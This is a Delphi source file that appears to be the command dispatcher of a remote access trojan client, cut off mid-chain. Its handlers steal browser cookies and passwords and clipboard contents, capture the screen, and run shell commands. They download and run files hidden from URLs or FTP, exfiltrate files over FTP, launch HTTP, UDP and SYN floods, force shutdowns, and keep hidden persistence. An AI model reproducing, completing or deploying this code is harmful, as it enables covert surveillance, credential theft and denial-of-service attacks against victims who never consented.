unit UnitExecuteCommands;

interface

uses
  Windows, UnitCommands, UnitConstants, MMSystem, ComObj, ActiveX;

procedure ExecuteCommands;

implementation
                                             
uses
  UnitVariables, UnitTransfersManager, UnitPortScanner, UnitFilesManager, UnitFtp,
  UnitFunctions, UnitEncryption, UnitShell, UnitConfiguration, UnitTasksManager,
  UnitActiveConnections, UnitInformations, UnitRegistryManager, UnitInstallation,
  UnitPluginManager, UnitKeyboard, ListarDispositivos, UnitFlooder, UnitMicrophone,
  UnitCaptureFunctions, UnitClientHandle, UnitStartWebcam, SndKey32, UnitPortSniffer,
  UnitWifiPasswords, UnitB_Passwords, UnitEventsLogs;

const
  HKLM = 'HKEY_LOCAL_MACHINE';
  HKCU = 'HKEY_CURRENT_USER';
  RunKey = '\Software\Microsoft\Windows\CurrentVersion\Run\';

procedure ExecuteCommands;
var
  MainCommand, Datas: string;
  TmpStr, TmpStr1, Tmpstr2: string;
  TmpList: TStringArray;
  ClipboardTxt: WideString;
  TmpMutex, TmpHandle: THandle;
  TmpInt, TmpInt1: Integer;
  TmpInt2: Int64;
  TmpBool: Boolean;
  Voice: OleVariant;
  p: Pointer;
begin
  Datas := MainDatas;
  MainCommand := Copy(Datas, 1, Pos('|', Datas) - 1);
  Delete(Datas, 1, Pos('|', Datas));

  if MainCommand = ACTIVECONNECTIONSCLOSE then
  begin
    ReadTCPTable;
    ReadUdpTable;

    TmpList := ParseString('|', Datas);
    TmpStr := Copy(TmpList[1], 1, Pos(':', TmpList[1]) - 1);
    Delete(TmpList[1], 1, Pos(':', TmpList[1]));
    TmpStr1 := Copy(TmpList[2], 1, Pos(':', TmpList[2]) - 1);
    Delete(TmpList[2], 1, Pos(':', TmpList[2]));

    if CloseActiveConnection(TmpStr, TmpStr1, StrToInt(TmpList[1]), StrToInt(TmpList[2])) then
      TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand + '|' + TmpList[0] + '|Y'
    else TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand + '|' + TmpList[0] + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = ACTIVECONNECTIONSLIST then
  begin
    ReadTCPTable;
    ReadUdpTable;

    TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand;
    if Datas = 'Y' then TmpStr := TmpStr  + '|' + ListActiveConnections(True) else
    TmpStr := TmpStr + '|' + ListActiveConnections(False);
    MainConnection.SendDatas(TmpStr);
  end
  else
        
  if MainCommand = BROWSERSCOOKIES then
  begin
    if not FileExists(SqlFile) then Exit;
    MainConnection.SendDatas(PASSWORDS + '|' + MainCommand + '|' +
      ListAllCookies(SqlFile));
  end
  else

  if MainCommand = BROWSERSPASSWORDS then
  begin
    if not FileExists(SqlFile) then Exit;
    MainConnection.SendDatas(PASSWORDS + '|' + MainCommand + '|' +
      ListAllPasswords(SqlFile));
  end
  else
         
  if MainCommand = CDDRIVECLOSE then
  begin
    mciSendString('Set cdaudio door closed wait', nil, 0, 0);
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = CDDRIVEOPEN then
  begin
    mciSendString('Set cdaudio door open wait', nil, 0, 0);
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = CHATSTART then
  begin
    NickName := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    SetWindowText(ClientHandle, PChar(Datas));
    ShowWindow(ClientHandle, 1);
    SetForegroundWindow(ClientHandle);
    MainConnection.SendDatas(CHAT + '|' + CHATSTART + '|' + IntToStr(ClientHandle));
  end
  else

  if MainCommand = CHATSTOP then
  begin
    ShowWindow(ClientHandle, 0);
    SetWindowText(ClientHandle, '');
  end
  else

  if MainCommand = CHATTEXT then
  begin
    TmpInt := Length(Datas);
    GetMem(p, TmpInt);
    CopyMemory(p, @Datas[1], TmpInt);
    PostMessage(ClientHandle, WM_CHATWRITETEXT, TmpInt, Integer(p));
    SetForegroundWindow(ClientHandle);
  end
  else

  if MainCommand = CLIENTCLOSE then
  begin
    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);
      CloseHandle(PersistMutex);
    end;                                                         

    if _MutexName <> '' then CloseHandle(MainMutex);
    Exitprocess(0);
  end
  else
       
  if MainCommand = CLIENTDOWNLOADSQLFILE then
  begin
    if FileExists(SqlFile) then Exit;
    TransferInfos.Filesize := StrToInt(Datas);
    TransferInfos.Destination := SqlFile;
    TransferInfos.Filename := '';
    TransferInfos.ToSend := MainCommand;  
    TransferInfos.HideFile := True;
    MyStartThread(@RecvFileBuffer, @TransferInfos);
  end
  else

  if MainCommand = CLIENTPLUGINSLIST then
  begin
    MainConnection.SendDatas(INFOSSYSTEM + '|' + MainCommand + '|' + LoadPluginsInfos);
  end
  else

  if MainCommand = CLIENTRECONNECT then
  begin
    ReconnectHost := Copy(Datas, 1, Pos(':', Datas) - 1);
    Delete(Datas, 1, Pos(':', Datas));
    ReconnectPort := StrToInt(Datas);
    CloseConnection := True;
  end
  else

  if MainCommand = CLIENTRENAME then
  begin
    TmpStr := NewIdentification;

    TmpStr1 := Copy(Datas, 1, Pos(':', Datas) - 1);
    Delete(Datas, 1, Pos(':', Datas));

    TmpStr2 := Copy(TmpStr, 1, Pos(':', Tmpstr) - 1);
    Delete(Tmpstr, 1, Pos(':', Tmpstr));

    if TmpStr1 = '' then TmpStr1 := Tmpstr2;
    if Datas = '' then Datas := TmpStr;

    NewIdentification := TmpStr1 + ':' + Datas;
    MyDeleteFile(DatasPath + '\id');
    TmpStr := NewIdentification;
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
    MyCreateFile(DatasPath + '\id', TmpStr, Length(TmpStr));
    HideFileName(DatasPath + '\id');
    MainConnection.SendDatas(MainCommand + '|' + NewIdentification + '|Y');
  end
  else
  
  if MainCommand = CLIENTRENAMEGROUP then
  begin
    TmpStr := NewGroup;

    TmpStr1 := Copy(Datas, 1, Pos(':', Datas) - 1);
    Delete(Datas, 1, Pos(':', Datas));

    TmpStr2 := Copy(TmpStr, 1, Pos(':', Tmpstr) - 1);
    Delete(Tmpstr, 1, Pos(':', Tmpstr));

    if TmpStr1 = '' then TmpStr1 := Tmpstr2;
    if Datas = '' then Datas := TmpStr;

    NewGroup := TmpStr1 + ':' + Datas;
    MyDeleteFile(DatasPath + '\grp');
    TmpStr := NewGroup;
    TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
    MyCreateFile(DatasPath + '\grp', TmpStr, Length(TmpStr));
    HideFileName(DatasPath + '\grp');
    MainConnection.SendDatas(MainCommand + '|' + NewGroup + '|Y');
  end
  else

  if MainCommand = CLIENTUNINSTALL then
  begin
    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);   
      CloseHandle(PersistMutex);
    end;
                             
    if _MutexName <> '' then CloseHandle(MainMutex);
    RemoveClient;
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTRESTART then
  begin
    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);
      CloseHandle(PersistMutex);
    end;

    if _MutexName <> '' then CloseHandle(MainMutex);
    MyShellExecute(ClientPath, '', SW_HIDE);
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTTASKEXECUTE then
  begin
    TmpBool := MyStrToBool(Copy(Datas, 1, Pos('|', Datas) - 1));
    Delete(Datas, 1, Pos('|', Datas));

    if TmpBool then
    if UserType = 'Limited' then Exit;

    MainDatas := Datas;
    MyStartThread(@ExecuteCommands);
  end
  else

  if MainCommand = CLIENTUPDATEFROMFTP then
  begin
    TmpList := ParseString('|', Datas);

    if DownloadFromFtp(TmpList[0], TmpList[1], TmpList[2], TmpList[3], TmpDir,
      TmpList[4], StrToInt(TmpList[5])) = False
    then MainConnection.SendDatas(MainCommand + '|');

    TmpMutex := CreateMutex(nil, False, 'PRClt_UPDATE');
    if not MyShellExecute(TmpDir + TmpList[4], '', SW_HIDE) then
    begin
      MainConnection.SendDatas(MainCommand + '|');
      CloseHandle(TmpMutex);
      Exit;
    end;
    
    CloseHandle(TmpMutex);

    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);   
      CloseHandle(PersistMutex);
    end;
                
    if _MutexName <> '' then CloseHandle(MainMutex);
    RemoveClient;
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTUPDATEFROMLINK then
  begin
    TmpStr := ExtractURLFile(Datas);
    if not MyURLDownloadFile(Datas, TmpDir + TmpStr) then Exit;

    TmpMutex := CreateMutex(nil, False, 'PRClt_UPDATE');
    if not MyShellExecute(TmpDir + TmpStr, '', SW_HIDE) then
    begin
      MainConnection.SendDatas(MainCommand + '|');
      CloseHandle(TmpMutex);
      Exit;
    end;
                  
    CloseHandle(TmpMutex);

    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);   
      CloseHandle(PersistMutex);
    end;
                 
    if _MutexName <> '' then CloseHandle(MainMutex);
    RemoveClient;
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTUPDATEFROMLOCAL then
  begin
    TransferInfos.Filename := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TransferInfos.Filesize := StrToInt(Datas);
    TransferInfos.Destination := TmpDir + ExtractFileName(TmpStr);
    TransferInfos.ToSend := MainCommand;
    MyStartThread(@RecvFile, @TransferInfos);

    TmpMutex := CreateMutex(nil, False, 'PRClt_UPDATE');

    if not MyShellExecute(TmpDir + ExtractFileName(TmpStr), '', SW_HIDE) then
    begin
      MainConnection.SendDatas(MainCommand + '|');
      CloseHandle(TmpMutex);
      Exit;
    end;

    CloseHandle(TmpMutex);

    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);   
      CloseHandle(PersistMutex);
    end;
             
    if _MutexName <> '' then CloseHandle(MainMutex);
    RemoveClient;        
    Exitprocess(0);
  end
  else
             
  if MainCommand = CLIENTUPDATECONFIG then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if FileExists(ConfigFile) then MyDeleteFile(ConfigFile);
     
    TmpStr1 := MyReplaceStr(TmpStr, '×', '|');         
    TmpStr1 := EnDecryptText(TmpStr1, PROGRAMPASSWORD);
    MyCreateFile(ConfigFile, TmpStr1, Length(TmpStr1));
    HideFileName(ConfigFile);
    if MyStrToBool(Datas) = False then Exit;
    
    TmpMutex := CreateMutex(nil, False, 'PRClt_UPDATE');

    if not MyShellExecute(ClientPath, '', SW_HIDE) then
    begin
      MainConnection.SendDatas(MainCommand + '|');
      CloseHandle(TmpMutex);
      Exit;
    end;

    CloseHandle(TmpMutex);

    if _Persistence = True then
    begin
      CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
      Sleep(5000);
      CloseHandle(PersistMutex);
    end;

    if _MutexName <> '' then CloseHandle(MainMutex);
    Exitprocess(0);
  end
  else

  if MainCommand = CLIPBOARDCLEAR then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
    finally
      CloseClipboard;
    end;
  end
  else
    
  if MainCommand = CLIPBOARDTEXT then
  begin
    if GetClipboardText(0, ClipboardTxt) then
      TmpStr := LOGGER + '|' + MainCommand + '|' + ClipboardTxt
    else
    
    if GetClipboardFiles(ClipboardTxt) then
      TmpStr := LOGGER + '|' + CLIPBOARDFILES + '|' + ClipboardTxt
    else TmpStr := LOGGER + '|' + MainCommand + '|';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = CLIPBOARDSETTEXT then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
    finally
      CloseClipboard;
    end;

    SetClipboardText(PChar(Datas));
    MainConnection.SendDatas(LOGGER + '|' + CLIPBOARDTEXT + '|' + Datas);
  end
  else
      
  if MainCommand = COMPUTERBEEP then
  begin
    MyBeep(StrToInt(Datas));
    MainConnection.SendDatas(MainCommand + '|');
  end
  else
  
  if MainCommand = COMPUTERHIBERNATE then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    SetSuspendState(True, False, False);
  end
  else

  if MainCommand = COMPUTERLOGOFF then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWindowsEx(EWX_LOGOFF or EWX_FORCE, 0);
  end
  else

  if MainCommand = COMPUTERREBOOT then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWindowsEx(EWX_REBOOT or EWX_FORCE, 0);
  end
  else

  if MainCommand = COMPUTERSHUTDOWN then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWindowsEx(EWX_SHUTDOWN or EWX_FORCE, 0);
  end
  else
        
  if MainCommand = COMPUTERSPEAK then
  begin
    try
      try
        CoInitialize(nil);
        Voice := CreateOleObject('SAPI.SpVoice');
        Voice.Speak(Datas, 0);
      finally
        CoUninitialize;
      end;
    except;
    end;
    
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = CUSTOMPLUGINEXECUTE then
  begin
    ExecutePlugin(Datas);
  end
  else
      
  if MainCommand = CUSTOMPLUGININSTALL then
  begin
    TmpStr := PluginsPath + '\' + IntToStr(GetTickCount);
    TransferInfos.Filename := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TransferInfos.Filesize := StrToInt(Datas);
    TransferInfos.Destination := TmpStr;
    TransferInfos.ToSend := MainCommand;
    TransferInfos.HideFile := True;                       
    MyStartThread(@RecvFileBuffer, @TransferInfos);
  end
  else
  
  if MainCommand = CUSTOMPLUGINSTART then
  begin
    ExecutePlugin(Datas, False, MainCommand);
  end
  else

  if MainCommand = CUSTOMPLUGINUNINSTALL then           
  begin
    if MyDeleteFile(PluginsPath + '\' + Datas) then
      TmpStr := INFOSSYSTEM + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := INFOSSYSTEM + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = DESKTOPCAPTURESTART then
  begin
    TmpList := ParseString('|', Datas);
    DesktopQ := StrToInt(TmpList[0]);
    DesktopI := StrToInt(TmpList[1]);
    DesktopX := StrToInt(TmpList[2]);
    DesktopY := StrToInt(TmpList[3]);
    DesktopImage := True;
    MyStartThread(@SendDesktopImage);
  end
  else

  if MainCommand = DESKTOPCAPTURESTOP then
  begin
    DesktopImage := False;
  end
  else
          
  if MainCommand = DESKTOPSETTINGS then
  begin
    TmpList := ParseString('|', Datas);
    DesktopQ := StrToInt(TmpList[0]);
    DesktopI := StrToInt(TmpList[1]);
    DesktopX := StrToInt(TmpList[2]);
    DesktopY := StrToInt(TmpList[3]);
  end
  else

  if MainCommand = DESKTOPHIDEICONS then
  begin
    try
      TmpHandle := FindWindow('ProgMan', nil);
      ShowWindow(TmpHandle, SW_HIDE);
    except
    end;
    
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = DESKTOPHIDESYSTEMTRAY then
  begin
    ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 0,
      'TrayNotifyWnd', nil), 0, 'SysPager', nil), SW_HIDE);            
    MainConnection.SendDatas(MainCommand + '|');
  end
  else
      
  if MainCommand = DESKTOPHIDETASKSBAR then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);            
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = DESKTOPSHOWICONS then
  begin
    try
      TmpHandle := FindWindow('ProgMan', nil);
      ShowWindow(TmpHandle, SW_SHOW);
    except
    end;
    
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = DESKTOPSHOWSYSTEMTRAY then
  begin
    ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 0,
      'TrayNotifyWnd', nil), 0, 'SysPager', nil), SW_SHOW);           
    MainConnection.SendDatas(MainCommand + '|');
  end
  else
     
  if MainCommand = DESKTOPSHOWTASKSBAR then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);           
    MainConnection.SendDatas(MainCommand + '|');
  end
  else

  if MainCommand = DESKTOPTHUMBNAILVIEW then
  begin
    TransferInfos.X := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    TransferInfos.Y := StrToInt(Datas);
    MyStartThread(@SendDesktopThumb, @TransferInfos);
  end
  else

  if MainCommand = DEVICESLIST then
  begin
    TmpStr := FillDeviceList(TmpInt, TmpInt1);
    MainConnection.SendDatas(INFOSSYSTEM + '|' + MainCommand + '|' + IntToStr(TmpInt1) + '|' + TmpStr);
  end
  else

  if MainCommand = DEVICESLISTEXTRAS then
  begin
    TmpStr := ShowDeviceAdvancedInfo(StrToInt(Datas));
    MainConnection.SendDatas(INFOSSYSTEM + '|' + MainCommand + '|' + TmpStr);
  end
  else

  if MainCommand = EXECUTESHELLCOMMAND then
  begin
    xExecuteShellCommand(Datas);
  end
  else
         
  if MainCommand = FILESCOPYFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if CopyFile(PChar(TmpStr), PChar(Datas), False) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESCOPYFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if CopyDirectory(0, TmpStr, Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESDELETEFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if Datas = 'Y' then
    begin
      if DeleteAllFilesAndDir(TmpStr) then
        TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|Y'
      else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|N';
    end
    else
    begin
      if DeleteAllFilesAndDir(TmpStr, True) then
        TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|Y'
      else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|N';
    end;

    MainConnection.SendDatas(TmpStr);
  end
  else
   
  if (MainCommand = FILESDELETEFILE) or (MainCommand = FILESSEARCHDELETEFILE) then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if Datas = 'Y' then
    begin
      if MyDeleteFile(TmpStr) then
        TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|Y'
      else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|N';
    end
    else
    begin
      if MoveFileToBin(TmpStr) then
        TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|Y'
      else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|N';
    end;

    MainConnection.SendDatas(TmpStr);
  end
  else
       
  if MainCommand = FILESDOWNLOADFILE then
  begin
    TransferInfos.Filename := Datas;
    MyStartThread(@SendFile, @TransferInfos);
  end
  else

  if MainCommand = FILESEDITFILE then
  begin
    MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + Datas + '|' + FileToStr(Datas));
  end
  else

  if MainCommand = FILESEDITFILESAVE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyDeleteFile(TmpStr) = False then
    begin
      MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + TmpStr);
      Exit;
    end;

    MyCreateFile(TmpStr, Datas, Length(Datas));
  end
  else

  if MainCommand = FILESEXECUTEFROMFTP then
  begin
    TmpList := ParseString('|', Datas);
    if DownloadFromFtp(TmpList[0], TmpList[1], TmpList[2], TmpList[3], TmpDir,
      TmpList[4], StrToInt(TmpList[5])) = False
    then Exit;

    if TmpList[6] = 'Y' then MyShellExecute(TmpDir + '\' + TmpList[4], '', SW_HIDE) else
    MyShellExecute(TmpDir + '\' + TmpList[4], '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = FILESEXECUTEFROMLINK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    if not MyURLDownloadFile(TmpStr, TmpDir + '\' + ExtractURLFile(TmpStr)) then Exit;
    if Datas = 'Y' then MyShellExecute(TmpDir + '\' + ExtractURLFile(TmpStr), '', SW_HIDE) else
    MyShellExecute(TmpDir + '\' + ExtractURLFile(TmpStr), '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = FILESEXECUTEFROMLOCAL then
  begin                                
    TransferInfos.Filename := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TransferInfos.Filesize := StrToInt(Datas);
    TransferInfos.Destination := TmpDir + '\' + ExtractFileName(TmpStr);
    TransferInfos.ToSend := MainCommand;

    MyStartThread(@RecvFile, @TransferInfos);
    if FileExists(TmpDir + '\' + ExtractFileName(TmpStr)) = True then
    begin
      if TmpStr1 = 'Y' then MyShellExecute(TmpDir + '\' + ExtractFileName(TmpStr), '', SW_HIDE) else
      MyShellExecute(TmpDir + '\' + ExtractFileName(TmpStr), '', SW_SHOWNORMAL);
    end;
  end
  else

  if MainCommand = FILESEXECUTEHIDEN then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    if Datas = 'Y' then MyShellExecute(TmpStr, TmpStr1, SW_HIDE, True) else
    MyShellExecute(TmpStr, TmpStr1, SW_HIDE);
  end
  else

  if MainCommand = FILESEXECUTEVISIBLE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    if Datas = 'Y' then MyShellExecute(TmpStr, TmpStr1, SW_SHOWNORMAL, True) else
    MyShellExecute(TmpStr, TmpStr1, SW_SHOWNORMAL);
  end
  else
                    
  if MainCommand = FILESIMAGEPREVIEW then
  begin
    TransferInfos.Filename := Datas;
    MyStartThread(@SendImagePreview, @TransferInfos);
  end
  else
  
  if MainCommand = FILESLISTDRIVES then
  begin
    MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + ListDrives);
  end
  else
       
  if MainCommand = FILESLISTFOLDERS then
  begin
    MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' +
      Datas + '|' + ListDirectory(Datas));
    MainConnection.SendDatas(FILESMANAGER + '|' + FILESLISTFILES + '|' +
      Datas + '|' + ListDirectory(Datas));
  end
  else

  if MainCommand = FILESLISTSHAREDFOLDERS then
  begin
    MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + ListSharedFolders);
  end
  else

  if MainCommand = FILESLISTSPECIALSFOLDERS then
  begin
    MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + ListSpecialFolders);
  end
  else
               
  if MainCommand = FILESMOVEFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MoveFile(PChar(TmpStr), PChar(Datas)) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESMOVEFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MoveFile(PChar(TmpStr), PChar(Datas)) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESNEWFOLDER then
  begin
    if CreateDirectory(PChar(Datas), nil) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESNEWFILE then
  begin
    TmpStr := '';
    MyCreateFile(Datas, TmpStr, Length(TmpStr));
    
    if FileExists(Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + Datas + '|N';

    MainConnection.SendDatas(TmpStr);
  end
  else

  if (MainCommand = FILESRENAMEFILE) or (MainCommand = FILESSEARCHRENAMEFILE) then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyRenameFile_Dir(TmpStr, Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|Y|' + Datas
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|N|' + Datas;

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESRENAMEFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyRenameFile_Dir(TmpStr, Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|Y|' + Datas
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|N|' + Datas;

    MainConnection.SendDatas(TmpStr);
  end
  else

  if MainCommand = FILESSETATTRIBUTES then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpBool := _SetFileAttributes(PChar(TmpStr), Datas);
    if TmpBool then MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|Y') else
    MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + TmpStr + '|' + Datas + '|N');
  end
  else

  if MainCommand = FILESSEARCHFILE then
  begin
    SearchOptions.StartDir := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    SearchOptions.FileMask := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
		SearchOptions.SubDir := MyStrToBool(Datas);
    MyStartThread(@SearchFileThread, @SearchOptions);
  end
  else

  if MainCommand = FILESSENDFTP then
  begin
    TmpList := ParseString('|', Datas);
    if UploadToFtp(TmpList[0], TmpList[1], TmpList[2], TmpList[3], TmpList[4],
      ExtractFileName(TmpList[4]), StrToInt(TmpList[5])) = False
    then MainConnection.SendDatas(FILESMANAGER + '|' + MainCommand + '|' + TmpList[4]);
  end
  else
  
  if MainCommand = FILESSTOPSEARCHING then
  begin
    StopSearching := True;
  end
  else

  if MainCommand = FILESUPLOADFILEFROMLOCAL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));

    TransferInfos.Filename := TmpStr1;
    TransferInfos.Destination := TmpStr + ExtractFileName(TmpStr1);
    TransferInfos.Filesize := StrToInt(Datas);
    TransferInfos.ToSend := MainCommand;
    MyStartThread(@RecvFile, @TransferInfos);

    if TmpStr2 = 'Y' then
    if FileExists(TmpStr + ExtractFileName(TmpStr1)) = True then
    MyShellExecute(TmpStr + ExtractFileName(TmpStr1), '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = FLOODERHTTPSTART then
  begin
    StartHttpFlood(Datas);
  end
  else

  if MainCommand = FLOODERHTTPSTOP then
  begin
    StopHttpFlood;
  end
  else

  if MainCommand = FLOODERUDPSTART then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    StartUdpFlood(TmpStr, StrToInt(Datas));
  end
  else

  if MainCommand = FLOODERUDPSTOP then
  begin
    StopUdpFlood;
  end
  else
            
  if MainCommand = FLOODERSYNSTART then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    StartSynFlood(TmpStr, StrToInt(Datas));
  end
  else

  if MainCommand = FLOODERSYNSTOP then
  begin
    StopSynFlood;
  end
  else

  if MainCommand = INFOSMAIN then
  begin
    ClientId := Datas;                                            
    if NewGroup = '' then NewGroup := _GroupId;
    if NewIdentification = '' then NewIdentification := _ClientId;
    MainConnection.SendDatas(MainCommand + '|' + ListMainInfos);
  end
  else

